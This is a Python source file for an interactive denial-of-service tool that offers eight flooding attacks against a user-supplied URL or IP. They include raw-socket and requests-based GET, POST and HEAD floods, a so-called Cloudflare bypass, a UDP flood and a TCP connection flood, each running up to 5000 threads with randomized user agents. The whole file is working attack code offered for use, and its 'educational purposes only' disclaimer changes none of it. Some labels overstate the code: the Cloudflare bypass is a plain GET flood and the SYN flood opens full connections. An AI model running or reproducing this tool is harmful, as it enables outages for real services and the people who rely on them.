import os
import sys
import time
import socket
import random
import threading
import requests
import ssl
import warnings
from urllib3.exceptions import InsecureRequestWarning
from datetime import datetime
from urllib.parse import urlparse

warnings.simplefilter('ignore', InsecureRequestWarning)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def ddos_menu():
    while True:
        clear_screen()
        print("\n  === DDoS TOOLS ===")
        print("  [CAUTION: Educational Purposes Only]\n")
        print("  [Layer 7]")
        print("  [1] CF Bypass Attack")
        print("  [2] Socket Attack")
        print("  [3] HTTP/2 Request Attack")
        print("  [4] GET Flood Attack")
        print("  [5] POST Flood Attack")
        print("  [6] HEAD Request Attack")
        print("\n  [Layer 4]")
        print("  [7] UDP Flood Attack")
        print("  [8] TCP SYN Flood Attack")
        print("\n  [0] Back to Main Menu")
    
        choice = input("\n  Select an option: ")
        
        if choice == "1":
            cloudflare_bypass()
        elif choice == "2":
            socket_attack()
        elif choice == "3":
            http2_attack()
        elif choice == "4":
            get_flood()
        elif choice == "5":
            post_flood()
        elif choice == "6":
            head_flood()
        elif choice == "7":
            udp_flood()
        elif choice == "8":
            tcp_syn_flood()
        elif choice == "0":
            return
        else:
            print("  Invalid option. Please try again...")
            time.sleep(1)

def disclaimer():
    clear_screen()
    print("\n  === DISCLAIMER ===")
    print("\n  WARNING: This tool is provided for educational purposes only.")
    print("  Using this tool against targets without explicit permission is illegal.")
    print("  You are solely responsible for your actions and any consequences.")
    print("  The author(s) disclaim any liability for misuse of this tool.")
    print("\n  By continuing, you confirm that you will only use this tool")
    print("  for legal activities, such as testing your own systems or")
    print("  systems you have permission to test.")
    
    choice = input("\n  Do you understand and agree? (Y/N): ")
    
    if choice.lower() != "y":
        print("\n  You must agree to the disclaimer to continue.")
        time.sleep(2)
        return False
    
    return True

def get_target():
    target = input("\n  Enter target URL/IP: ")
    if not target:
        print("  Invalid target")
        time.sleep(1)
        return None
    
    if not target.startswith(('http://', 'https://')):
        if ":" in target:
            return target
        print("  Adding 'http://' prefix")
        target = 'http://' + target
    
    try:
        parsed = urlparse(target)
        if not parsed.netloc:
            print("  Invalid URL format")
            time.sleep(1)
            return None
        return target
    except:
        print("  Invalid URL format")
        time.sleep(1)
        return None

def get_thread_count():
    try:
        thread_count = input("\n  Enter number of threads (default 100): ")
        if not thread_count:
            return 100
        thread_count = int(thread_count)
        if thread_count <= 0:
            return 100
        return min(thread_count, 5000)
    except ValueError:
        print("  Invalid input. Using default value of 100 threads.")
        time.sleep(1)
        return 100

def get_duration():
    try:
        duration = input("\n  Enter attack duration in seconds (default 60): ")
        if not duration:
            return 60
        duration = int(duration)
        if duration <= 0:
            return 60
        return min(duration, 3600)
    except ValueError:
        print("  Invalid input. Using default value of 60 seconds.")
        time.sleep(1)
        return 60

def generate_user_agent():
    platforms = ['Windows NT 10.0; Win64; x64', 'X11; Linux x86_64', 'Macintosh; Intel Mac OS X 10_15_7']
    browsers = [
        f'Chrome/{random.randint(70, 108)}.0.{random.randint(1000, 9999)}.{random.randint(10, 999)}',
        f'Firefox/{random.randint(70, 108)}.0',
        f'Safari/{random.randint(605, 610)}.{random.randint(1, 9)}.{random.randint(1, 9)}'
    ]
    
    platform = random.choice(platforms)
    browser = random.choice(browsers)
    
    return f'Mozilla/5.0 ({platform}) AppleWebKit/{random.randint(535, 537)}.{random.randint(1, 36)} (KHTML, like Gecko) {browser}'

def parse_url(url):
    try:
        parsed = urlparse(url)
        protocol = parsed.scheme
        host = parsed.netloc
        
        if ":" in host:
            host, port = host.split(":")
            port = int(port)
        else:
            port = 443 if protocol == "https" else 80
            
        path = parsed.path
        if not path:
            path = "/"
            
        return protocol, host, port, path
    except Exception as e:
        print(f"Error parsing URL: {e}")
        return None, None, None, None

def display_progress(method_name, counter, start_time, stop_event, thread_count):
    elapsed = 0
    last_count = 0
    rate = 0
    
    while not stop_event.is_set():
        current = counter.value
        now = time.time()
        elapsed = now - start_time
        
        if elapsed > 0:
            rate = current / elapsed
        
        per_thread = 0
        if thread_count > 0:
            per_thread = current / thread_count
        
        diff = current - last_count
        last_count = current
        
        if elapsed >= 1:
            print(f"  {method_name} | Time: {elapsed:.1f}s | Sent: {current:,} | Rate: {rate:.2f}/s | Δ: +{diff} | Per Thread: {per_thread:.1f}", end="\r")
        
        time.sleep(0.5)

class Counter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()
    
    def increment(self, amount=1):
        with self.lock:
            self.value += amount
            return self.value

def cloudflare_bypass_worker(protocol, host, port, path, event, counter):
    user_agent = generate_user_agent()
    
    while not event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            
            if protocol == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            
            payload = f"GET {path} HTTP/1.1\r\n"
            payload += f"Host: {host}\r\n"
            payload += f"User-Agent: {user_agent}\r\n"
            payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            payload += "Accept-Language: en-US,en;q=0.5\r\n"
            payload += "Accept-Encoding: gzip, deflate, br\r\n"
            payload += "Connection: keep-alive\r\n"
            payload += "Upgrade-Insecure-Requests: 1\r\n"
            payload += "Cache-Control: max-age=0\r\n\r\n"
            
            s.send(payload.encode())
            counter.increment()
            s.close()
        except:
            pass

def cloudflare_bypass():
    if not disclaimer():
        return
    
    target = get_target()
    if not target:
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    protocol, host, port, path = parse_url(target)
    if not host:
        print("  Failed to parse URL")
        time.sleep(1)
        return
    
    print(f"\n  Starting Cloudflare Bypass Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s")
    print("\n  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("CF-BYPASS", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=cloudflare_bypass_worker, args=(protocol, host, port, path, stop_event, counter))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
        
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total requests sent: {counter.value:,}")
    input("\n  Press Enter to continue...")

def socket_attack_worker(protocol, host, port, path, event, counter):
    while not event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            
            if protocol == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            
            for _ in range(10):
                payload = f"GET {path}?{random.randint(1, 1000000)} HTTP/1.1\r\n"
                payload += f"Host: {host}\r\n"
                payload += f"User-Agent: {generate_user_agent()}\r\n"
                payload += "Accept: */*\r\n"
                payload += "Connection: keep-alive\r\n\r\n"
                
                s.send(payload.encode())
                counter.increment()
                
                if event.is_set():
                    break
            
            s.close()
        except:
            pass

def socket_attack():
    if not disclaimer():
        return
    
    target = get_target()
    if not target:
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    protocol, host, port, path = parse_url(target)
    if not host:
        print("  Failed to parse URL")
        time.sleep(1)
        return
    
    print(f"\n  Starting Socket Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s")
    print(f"  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("SOCKET", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=socket_attack_worker, args=(protocol, host, port, path, stop_event, counter))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
            
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total requests sent: {counter.value:,}")
    input("\n  Press Enter to continue...")

def http2_attack_worker(target, event, counter):
    session = requests.Session()
    session.verify = False
    
    while not event.is_set():
        try:
            headers = {
                'User-Agent': generate_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
            }
            
            params = {str(random.randint(1, 100000)): str(random.randint(1, 100000))}
            
            session.get(target, headers=headers, params=params, timeout=5)
            counter.increment()
        except:
            pass

def http2_attack():
    if not disclaimer():
        return
    
    target = get_target()
    if not target:
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    print(f"\n  Starting HTTP/2 Request Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s")
    print(f"  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("HTTP2", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=http2_attack_worker, args=(target, stop_event, counter))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
            
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total requests sent: {counter.value:,}")
    input("\n  Press Enter to continue...")

def get_flood_worker(target, event, counter):
    session = requests.Session()
    session.verify = False
    
    while not event.is_set():
        try:
            params = {str(random.randint(1, 100000)): str(random.randint(1, 100000))}
            headers = {'User-Agent': generate_user_agent()}
            
            session.get(target, params=params, headers=headers, timeout=5)
            counter.increment()
        except:
                pass

def get_flood():
    if not disclaimer():
        return
    
    target = get_target()
    if not target:
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    print(f"\n  Starting GET Flood Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s")
    print(f"  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("GET-FLOOD", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=get_flood_worker, args=(target, stop_event, counter))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
            
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total requests sent: {counter.value:,}")
    input("\n  Press Enter to continue...")

def post_flood_worker(target, event, counter):
    session = requests.Session()
    session.verify = False
    
    while not event.is_set():
        try:
            data = {
                str(random.randint(1, 100000)): str(random.randint(1, 100000)) for _ in range(10)
            }
            
            headers = {
                'User-Agent': generate_user_agent(),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            session.post(target, data=data, headers=headers, timeout=5)
            counter.increment()
        except:
            pass

def post_flood():
    if not disclaimer():
        return
    
    target = get_target()
    if not target:
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    print(f"\n  Starting POST Flood Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s")
    print(f"  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("POST-FLOOD", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=post_flood_worker, args=(target, stop_event, counter))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
            
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total requests sent: {counter.value:,}")
    input("\n  Press Enter to continue...")

def head_flood_worker(target, event, counter):
    session = requests.Session()
    session.verify = False
    
    while not event.is_set():
        try:
            params = {str(random.randint(1, 100000)): str(random.randint(1, 100000))}
            headers = {'User-Agent': generate_user_agent()}
            
            session.head(target, params=params, headers=headers, timeout=5)
            counter.increment()
        except:
            pass

def head_flood():
    if not disclaimer():
        return
    
    target = get_target()
    if not target:
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    print(f"\n  Starting HEAD Request Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s")
    print(f"  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("HEAD-FLOOD", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=head_flood_worker, args=(target, stop_event, counter))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
            
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total requests sent: {counter.value:,}")
    input("\n  Press Enter to continue...")

def udp_flood_worker(ip, port, event, counter, size=1024):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not event.is_set():
        try:
            data = random._urandom(size)
            sock.sendto(data, (ip, port))
            counter.increment()
        except:
            pass

def udp_flood():
    if not disclaimer():
        return
    
    target = input("\n  Enter target IP:PORT: ")
    if not target or ":" not in target:
        print("  Invalid target format. Use IP:PORT")
        time.sleep(1)
        return
    
    try:
        ip, port = target.split(":")
        port = int(port)
        socket.inet_aton(ip)
    except:
        print("  Invalid IP:PORT format")
        time.sleep(1)
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    packet_size = input("\n  Enter packet size (default 1024): ")
    try:
        packet_size = int(packet_size)
        if packet_size <= 0:
            packet_size = 1024
    except:
        packet_size = 1024
    
    print(f"\n  Starting UDP Flood Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s, Packet size: {packet_size} bytes")
    print(f"  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("UDP-FLOOD", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=udp_flood_worker, args=(ip, port, stop_event, counter, packet_size))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
            
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total packets sent: {counter.value:,}")
    input("\n  Press Enter to continue...")

def tcp_syn_flood_worker(ip, port, event, counter):
    while not event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            counter.increment()
            s.close()
        except:
            pass

def tcp_syn_flood():
    if not disclaimer():
        return
    
    target = input("\n  Enter target IP:PORT: ")
    if not target or ":" not in target:
        print("  Invalid target format. Use IP:PORT")
        time.sleep(1)
        return
    
    try:
        ip, port = target.split(":")
        port = int(port)
        socket.inet_aton(ip)
    except:
        print("  Invalid IP:PORT format")
        time.sleep(1)
        return
    
    thread_count = get_thread_count()
    duration = get_duration()
    
    print(f"\n  Starting TCP SYN Flood Attack on {target}")
    print(f"  Threads: {thread_count}, Duration: {duration}s")
    print(f"  Attack started at:", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("  Press Ctrl+C to stop")
    
    stop_event = threading.Event()
    counter = Counter()
    threads = []
    
    progress_thread = threading.Thread(
        target=display_progress,
        args=("TCP-SYN", counter, time.time(), stop_event, thread_count)
    )
    progress_thread.daemon = True
    
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=tcp_syn_flood_worker, args=(ip, port, stop_event, counter))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        progress_thread.start()
        time.sleep(duration)
        stop_event.set()
        
        for thread in threads:
            thread.join(1)
            
        progress_thread.join(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n  Attack stopped by user")
    finally:
        stop_event.set()
    
    print("\n\n  Attack completed")
    print(f"  Total connections attempted: {counter.value:,}")
    input("\n  Press Enter to continue...")

if __name__ == "__main__":
    try:
        ddos_menu() 
    except KeyboardInterrupt:
        print("\n\n  Exiting...")
        sys.exit(0) 